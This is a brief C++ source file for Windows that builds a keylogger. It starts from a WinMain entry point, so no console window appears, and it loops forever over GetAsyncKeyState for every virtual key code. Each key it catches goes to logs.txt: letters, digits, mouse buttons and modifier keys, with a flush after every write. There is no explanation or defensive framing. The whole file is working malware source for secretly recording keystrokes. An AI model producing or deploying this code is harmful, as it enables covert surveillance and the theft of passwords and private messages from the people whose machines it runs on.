#include <windows.h>
#include <fstream>

#define PATH "logs.txt" // output file, certain output paths might require special permissions
std::ofstream outfile;

void readKeys();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    outfile.open(PATH);
    if (!outfile.is_open()) return 1;
    readKeys();
    return 0;
}

void readKeys() {
    while (true) {
        for (int i = 0; i < 256; i++) {
            if (GetAsyncKeyState(i) & 0b1) {
                if (std::isalnum(i)) outfile << (char)i;
                else if (i == VK_LBUTTON) outfile << "[LEFT_BUTTON]";
                else if (i == VK_RBUTTON) outfile << "[RIGHT_BUTTON]";
                else if (i == VK_MBUTTON) outfile << "[MIDDLE_BUTTON]";
                else if (i == VK_ESCAPE) outfile << "[ESCAPE]";
                else if (i == VK_BACK) outfile << "[BACK]";
                else if (i == VK_RETURN) outfile << "[ENTER]";
                else if (i == VK_SHIFT) outfile << "[SHIFT]";
                else if (i == VK_CONTROL) outfile << "[CONTROL]";
                else if (i == VK_MENU) outfile << "[ALT]";
                else if (i == VK_CAPITAL) outfile << "[CAPS_LOCK]";
                else if (i == VK_SPACE) outfile << "[SPACE]";
                else outfile << "[CODE:" << i << "]";
            }
            outfile.flush(); // ensure data is written to the file
        }
    }
}